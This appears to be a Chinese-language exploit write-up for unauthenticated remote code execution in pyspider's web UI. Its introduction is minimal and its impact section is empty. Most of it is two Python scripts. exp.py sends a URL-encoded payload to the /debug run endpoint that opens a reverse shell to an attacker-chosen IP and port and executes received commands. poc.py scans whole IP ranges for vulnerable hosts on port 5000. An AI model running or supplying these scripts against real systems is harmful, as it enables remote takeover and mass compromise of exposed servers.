# pyspider未授权访问

一、漏洞简介

pyspider未授权访问

二、影响范围

三、复现过程

https://github.com/ianxtianxt/Pyspider-webui-poc

**exp.py：**


```python
import requests
print("这是pyspider未授权访问的EXP，它能反弹shell,但由于本人VPS过期未能测试")
data='''
webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aimport+socket%0Aimport+os%0Aimport+sys%0Aimport+time%0Adef+test()%3A%0A++++hacker%3D%22192.168.0.144%22%0A++++port%3D1234%0A++++server%3D(hacker%2Cport)%0A++++s%3Dsocket.socket()%0A++++s.connect(server)%0A++++while+1%3A%0A++++++++dir%3Dos.getcwd()%0A++++++++s.send(dir.encode())%0A++++++++cmd%3Ds.recv(1024).decode()%0A++++++++if+cmd%3D%3D%22exit%22%3A%0A++++++++++++exit%0A++++++++elif+cmd.startswith(%22cd%22)%3A%0A++++++++++++os.chdir(cmd%5B2%3A%5D.strip())%0A++++++++++++result%3D%22Successfully+switched+directory!%22%0A++++++++else%3A%0A++++++++++++result%3Dos.popen(cmd).read()%0A++++++++if+not+result%3A%0A++++++++++++result%3D%22Command+Execution+Completed!%22%0A++++++++s.send(result.encode())%0A++++++++time.sleep(1)%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++exec(test())&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
'''
target=input("pyspider的URL:")
ip=input("你的ip:")
port=str(input("你的端口:"))
data=data.replace("192.168.0.144",ip).replace("1234",port)
headers={"Content-Type": "application/x-www-form-urlencoded"}
url=target+"/debug/pyspidervulntest/run"
try:
    requests.post(url=url,data=data,headers=headers,timeout=1)
except Exception:
    pass
print("已经发送paylaod请检查是否有shell弹回")
```

**poc.py：**


```python
import IPy
import requests
import datetime
def check_fast(ip,port):
    '''
    fast check 
    check title only
    '''
    url="http://"+ip+":"+str(port)
    try:
        r=requests.get(url=url,timeout=1)
        if '''<a class="btn btn-default btn-info" href='/tasks' target=_blank>Recent Active Tasks</a>''' in r.text:
            return True
    except Exception:
        return False
    return False
def check_accurate(ip,port):
    '''
    accurate check
    check if python script can be executed
    '''
    url="http://"+ip+":"+str(port)+"/debug/pyspidervulntest/run"
    headers={"Content-Type": "application/x-www-form-urlencoded"}
    data='''
    webdav_mode=false&script=from+pyspider.libs.base_handler+import+*%0Aclass+Handler(BaseHandler)%3A%0A++++def+on_start(self)%3A%0A++++++++print('pyspidervulnerable')&task=%7B%0A++%22process%22%3A+%7B%0A++++%22callback%22%3A+%22on_start%22%0A++%7D%2C%0A++%22project%22%3A+%22pyspidervulntest%22%2C%0A++%22taskid%22%3A+%22data%3A%2Con_start%22%2C%0A++%22url%22%3A+%22data%3A%2Con_start%22%0A%7D
    '''
    try:
        r=requests.post(url=url,data=data,headers=headers,timeout=1)
        if  '"logs": "pyspidervulnerable\\n"' in r.text:
            return True
    except Exception:
        return False
    return False
def main():
    print("Pyspider 未授权访问批量扫描器")
    print("本扫描器仅供希望检查自己网络的安全性的管理员使用")
    print("[1]精准扫描")
    print("[2]快速扫描")
    opt=input("选择扫描模式:")
    if str(opt).strip()=="1":
        scan_func=check_accurate
    else:
        scan_func=check_fast
    ipstart=int(IPy.IP(str(input("请输入起始ip:"))).strHex(),16)
    ipstop=int(IPy.IP(str(input("请输入结束ip:"))).strHex(),16)
    f=open("result.txt","a")
    f.write("pyspider未授权访问漏洞扫描报告\n扫描时间:"+datetime.datetime.now().strftime('%Y-%m-%d')+"\n存在漏洞的主机如下:\n")
    count=0
    for ip in range(ipstart,ipstop+1):
        ip=str(IPy.IP(ip))
        if scan_func(ip,"5000"):
            print("\x1b[31m"+"[-]",ip,"存在漏洞"+"\x1b[39m")
            f.write(ip+"\n")
            count+=1
        else:
            print("[*]",ip,"不存在漏洞")
    print("扫描完毕，共发现"+str(count)+"台主机存在漏洞") 
    f.write("扫描完毕，共发现"+str(count)+"台主机存在漏洞") 
    f.close()
    print("扫描结果已经存到result.txt")
if __name__ == "__main__":
   main()
```